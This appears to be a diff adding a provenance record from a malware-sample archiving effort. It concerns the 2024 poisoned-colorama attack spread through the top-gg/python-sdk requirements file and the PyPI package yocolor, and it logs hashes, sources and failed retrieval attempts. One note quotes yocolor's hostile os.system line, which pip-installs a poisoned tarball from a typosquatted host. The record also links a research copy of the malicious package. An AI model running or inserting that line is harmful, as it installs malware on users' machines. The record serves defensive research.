@@ -1,0 +1,208 @@
+schema_version: 1
+interpretation:
+  - >-
+    Two distribution paths carried this attack. One was the edited requirements.txt in
+    top-gg/python-sdk, pointing pip at colorama tarballs on files.pythanhosted.org and
+    files.pypihosted.org. The other was the PyPI package yocolor, which pulled the same poisoned
+    colorama on import.
+  - >-
+    The typosquatted mirrors are gone and were never archived: the Internet Archive holds one
+    capture of a files.pypihosted.org colorama path and it is a 404, and no configured hash provider
+    holds any of the three reported colorama digests. The malicious commit is also gone from
+    top-gg/python-sdk, whose requirements.txt history skips from 2021 to 2025.
+  - >-
+    yocolor survives in a public research corpus, and it is the more useful of the two: it names the
+    exact poisoned tarball URL the incident record carries.
+samples:
+  - artifact_id: yocolor
+    phase: during
+    classification: carrier
+    coordinate: pkg:pypi/yocolor@0.4.6
+    version: 0.4.6
+    filename: yocolor-0.4.6.tar.gz
+    path: yocolor/during/yocolor-0.4.6.tar.gz
+    sha256: 7e04cda1f7e5936bfe71cd5605cba284819ece4afff9a4ec8a57bc82d0b6bdab
+    size: 23038
+    source:
+      url: >-
+        https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/a67fe59149ceeae5cfae301f33d2ce6bd12005d1/yocolor/0.4.6/yocolor-0.4.6.tar.gz
+      original_url: https://pypi.org/project/yocolor/
+      retrieved_at: '2026-09-02T13:34:00Z'
+      kind: research_corpus
+    verification:
+      status: probable_exact
+      basis:
+        - git_object_id_verified
+        - measured_sha256
+      evidence:
+        - immutable_git_revision
+        - contents_match_checkmarx_description
+        - measured_sha256
+    notes:
+      - >-
+        A copy of colorama renamed to yocolor. The last line of yocolor/__init__.py is
+        os.system(f"{sys.executable} -m pip install https://files.pypihosted.org/packages/d8/53/
+        6f443c9a4a8358a93a6792e2acffb9d9d5cb0a5cfd8802644b7b1c9a02e4/colorama-0.4.6.tar.gz"), which
+        is exactly the URL the incident record lists as a distribution location.
+      - >-
+        setup.py also pip-installs fernet at build time, matching Checkmarx's account of a later
+        stage that decrypts hard-coded data with that library.
+      - >-
+        PyPI removed the project, so this is a retained research copy rather than the registry file.
+        No authoritative digest for the release survives to bind it, which is why it is
+        probable_exact rather than exact.
+    subject: yocolor
+unresolved:
+  - artifact_id: top-gg
+    phase: during
+    version: 0.4.3, 0.4.5, 0.4.6
+    filename: colorama-<version>.tar.gz
+    status: unavailable
+    reported_hash: >-
+      sha256:0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207,
+      sha256:35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb,
+      sha256:c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8
+    notes:
+      - >-
+        The poisoned colorama itself, served from the typosquatted mirrors under paths that copy
+        PyPI's real hash-based layout. Checkmarx reported the injected code sat first in
+        colorama/tests/__init__.py and was later moved to colorama/init.py.
+      - >-
+        The three reported digests are published as file hashes, so a recovered copy could be
+        verified as exact if one is ever found.
+    attempts:
+      - files.pythanhosted.org and files.pypihosted.org: hosts no longer resolve to the files.
+      - >-
+        Internet Archive: no captures for files.pythanhosted.org; a single files.pypihosted.org
+        capture of the colorama-0.4.3 path from 2024-03-13, and it is a 404.
+      - MalwareBazaar, Triage, Malshare: no sample for any of the three digests.
+      - VirusTotal: file download requires a Premium/Intelligence key.
+      - >-
+        DataDog malicious-software-packages-dataset and lxyeternal/pypi_malregistry: neither indexes
+        colorama.
+      - >-
+        Digest sweep, 2026-09-10: the 3 digest(s) this record names for artifacts with no during
+        sample were asked of MalwareBazaar, Triage and ReversingLabs. None is known to any of them.
+        An earlier sweep covered only records holding no during sample at all, so these had never
+        been probed; they have been now.
+    last_attempted_at: '2026-09-11T01:45:18Z'
+  - artifact_id: top-gg
+    phase: during
+    filename: requirements.txt
+    status: unavailable
+    notes:
+      - >-
+        The commit that repointed the dependency in top-gg/python-sdk. The file's commit history
+        runs from 2021-11-25 straight to 2025-09-16, so the March 2024 change was removed rather
+        than reverted, and GitHub no longer serves the object.
+    attempts:
+      - GitHub commit listing for the path: no commit in the incident window.
+      - >-
+        Digest sweep, 2026-09-10: the 3 digest(s) this record names for artifacts with no during
+        sample were asked of MalwareBazaar, Triage and ReversingLabs. None is known to any of them.
+        An earlier sweep covered only records holding no during sample at all, so these had never
+        been probed; they have been now.
+    last_attempted_at: '2026-09-11T01:45:18Z'
+  - artifact_id: top-gg
+    phase: during
+    coordinate: sha256:0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207
+    status: unavailable
+    attempts:
+      - >-
+        Forager PURL/SHA-256: time=2026-09-02T11:56:44.282-04:00 level=ERROR msg="command failed"
+        error="hash 0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207 unavailable
+        from configured sources: hopper: unexpected status code 404 from
+        http://10.9.8.10:8081/api/file/0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207;
+        malwarebazaar: MalwareBazaar has no sample for
+        0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207: hash_not_found; triage:
+        triage has no file analysis for SHA256
+        0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207; malshare: download
+        returned status 404"
+      - >-
+        Forager PURL/SHA-256: time=2026-09-03T06:16:36.775-04:00 level=ERROR msg="command failed"
+        error="hash 0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207 unavailable
+        from configured sources: hopper: unexpected status code 404 from
+        http://10.9.8.10:8081/api/file/0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207;
+        malwarebazaar: MalwareBazaar has no sample for
+        0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207: hash_not_found; triage:
+        triage has no file analysis for SHA256
+        0c1873196dbd88280f4d5cf409b7b53674b3ed85f8a1a28ece9caf2f98a71207; malshare: download
+        returned status 404"
+      - >-
+        Digest sweep, 2026-09-10: the 3 digest(s) this record names for artifacts with no during
+        sample were asked of MalwareBazaar, Triage and ReversingLabs. None is known to any of them.
+        An earlier sweep covered only records holding no during sample at all, so these had never
+        been probed; they have been now.
+    last_attempted_at: '2026-09-11T01:45:18Z'
+  - artifact_id: top-gg
+    phase: during
+    coordinate: sha256:35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb
+    status: unavailable
+    attempts:
+      - >-
+        Forager PURL/SHA-256: time=2026-09-02T11:57:00.278-04:00 level=ERROR msg="command failed"
+        error="hash 35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb unavailable
+        from configured sources: hopper: unexpected status code 404 from
+        http://10.9.8.10:8081/api/file/35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb;
+        malwarebazaar: MalwareBazaar has no sample for
+        35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb: hash_not_found; triage:
+        triage has no file analysis for SHA256
+        35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb; malshare: download
+        returned status 404"
+      - >-
+        Forager PURL/SHA-256: time=2026-09-03T06:16:36.856-04:00 level=ERROR msg="command failed"
+        error="hash 35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb unavailable
+        from configured sources: hopper: unexpected status code 404 from
+        http://10.9.8.10:8081/api/file/35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb;
+        malwarebazaar: MalwareBazaar has no sample for
+        35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb: hash_not_found; triage:
+        triage has no file analysis for SHA256
+        35ac61c83b85f6ddcf8ec8747f44400399ce3a9986d355834b68630270e669fb; malshare: download
+        returned status 404"
+      - >-
+        Digest sweep, 2026-09-10: the 3 digest(s) this record names for artifacts with no during
+        sample were asked of MalwareBazaar, Triage and ReversingLabs. None is known to any of them.
+        An earlier sweep covered only records holding no during sample at all, so these had never
+        been probed; they have been now.
+    last_attempted_at: '2026-09-11T01:45:18Z'
+  - artifact_id: top-gg
+    phase: during
+    coordinate: sha256:c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8
+    status: unavailable
+    attempts:
+      - >-
+        Forager PURL/SHA-256: time=2026-09-02T11:57:15.923-04:00 level=ERROR msg="command failed"
+        error="hash c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8 unavailable
+        from configured sources: hopper: unexpected status code 404 from
+        http://10.9.8.10:8081/api/file/c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8;
+        malwarebazaar: MalwareBazaar has no sample for
+        c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8: hash_not_found; triage:
+        triage has no file analysis for SHA256
+        c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8; malshare: download
+        returned status 404"
+      - >-
+        Forager PURL/SHA-256: time=2026-09-03T06:16:36.962-04:00 level=ERROR msg="command failed"
+        error="hash c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8 unavailable
+        from configured sources: hopper: unexpected status code 404 from
+        http://10.9.8.10:8081/api/file/c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8;
+        malwarebazaar: MalwareBazaar has no sample for
+        c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8: hash_not_found; triage:
+        triage has no file analysis for SHA256
+        c53b93be72e700f7e0c8d5333acd68f9dc5505fb5b71773ca9a8668b98a17ba8; malshare: download
+        returned status 404"
+      - >-
+        Digest sweep, 2026-09-10: the 3 digest(s) this record names for artifacts with no during
+        sample were asked of MalwareBazaar, Triage and ReversingLabs. None is known to any of them.
+        An earlier sweep covered only records holding no during sample at all, so these had never
+        been probed; they have been now.
+    last_attempted_at: '2026-09-11T01:45:18Z'
+  - artifact_id: yocolor
+    phase: before
+    status: unavailable
+    attempts:
+      - >-
+        PyPI predecessor lane, 2026-09-10: pypi.org lists no release with files for this package,
+        and the Aliyun, Tsinghua and BFSU mirrors all 404 it. PyPI mirrors replicate deletions
+        rather than retaining them, so unlike npm there is no mirror lane for a removed project and
+        the clean predecessor is not obtainable.
+    last_attempted_at: '2026-09-10T20:55:51Z'
